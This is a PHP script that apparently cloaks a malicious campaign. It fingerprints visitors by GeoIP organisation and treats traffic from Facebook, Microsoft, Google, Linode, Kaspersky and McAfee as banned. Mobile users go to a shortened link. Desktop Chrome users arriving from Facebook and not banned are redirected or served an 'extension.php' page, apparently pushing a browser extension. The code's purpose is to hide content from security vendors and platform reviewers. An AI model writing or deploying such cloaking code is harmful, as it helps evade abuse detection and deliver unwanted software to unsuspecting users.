<?php
ob_start();
require_once('includes/Mobile_Detect.php');
require_once('includes/Browser.php');
require_once('includes/functions.php');
require_once('config.php');
require_once('geoip.inc');
$detect = new Mobile_Detect;
$browser = new Browser();


$geoip_included = false;

function banned_country($country_code, $csv_banned){
  $banned_countries = explode(',', strtolower($csv_banned));
  $country_code = strtolower($country_code);
  if(in_array($country_code, $banned_countries))
    return true;
  else
    return false;
}

function banned_org($organisation_name, $csv_banned){
  $banned_orgs = explode(',', strtolower($csv_banned));
  $organisation_name = strtolower($organisation_name);
  foreach($banned_orgs as $banned_org){
    if($banned_org[0] == "%" && $banned_org[strlen($banned_org)-1] == "%"){
      if(contains(substr($banned_org, 1, -1),$organisation_name)) {
        return true;
        break;
      }
    }
    if($banned_org == $organisation_name){
      return true;
      break;
    }
  }
  return false;
}
function contains($needle, $haystack){
    return strpos($haystack, $needle) !== false;
}
function get_country_name($ip){
  global $geoip_included;
  $gi = geoip_open(__DIR__."/GeoIP.dat",GEOIP_STANDARD);
  $country_name = geoip_country_name_by_addr($gi, $ip);
  geoip_close($gi);

  return $country_name;
}
function get_country_code($ip){
  global $geoip_included;
  $gi = geoip_open(__DIR__."/GeoIP.dat",GEOIP_STANDARD);
  $country_code = geoip_country_code_by_addr($gi, $ip);
  geoip_close($gi);

  return $country_code;
}
function get_organisation_name($ip){
  global $geoip_included;
  $gio = geoip_open(__DIR__."/GeoIPOrg.dat",GEOIP_STANDARD);
  $org = geoip_org_by_addr($gio, $ip);
  geoip_close($gio);

  return $org;
}

$ip = $_SERVER['REMOTE_ADDR'];
$org_name = get_organisation_name($ip);
$banned_org   = banned_org($org_name, '%facebook%,%microsoft%,%linode%,%google%,%kaspersy%,%mcafee%');
#$banned_country = banned_country($country_code, $settings['banned_countries']);



$isref = false;
$banned = false;



if (strpos($_SERVER["HTTP_REFERER"], 'facebook') !== false){
    $isref = true;
}



if ($banned_org) {
  $banned = true;
}

  $mobile = "https://goo.gl/TdR8a3";
  $install = "http://".$app_site.$_SERVER["REQUEST_URI"];


if($detect->isMobile() || $browser->isMobile() && $banned == false){

  header("Location: ".$mobile);
  exit();

} else if($browser->getBrowser() == Browser::BROWSER_CHROME && $browser->getPlatform() != Browser::PLATFORM_X11 && $banned == false && $isref == true) { 

    
    if(strrpos($_SERVER["HTTP_HOST"], $app_site) === false){

      header("Location: ".$install);

    } else {

        require_once('extension.php');

    }
  exit();

} else {
  ob_end_clean();
        require_once('share.php');

 exit();
}

ob_end_flush();

?>
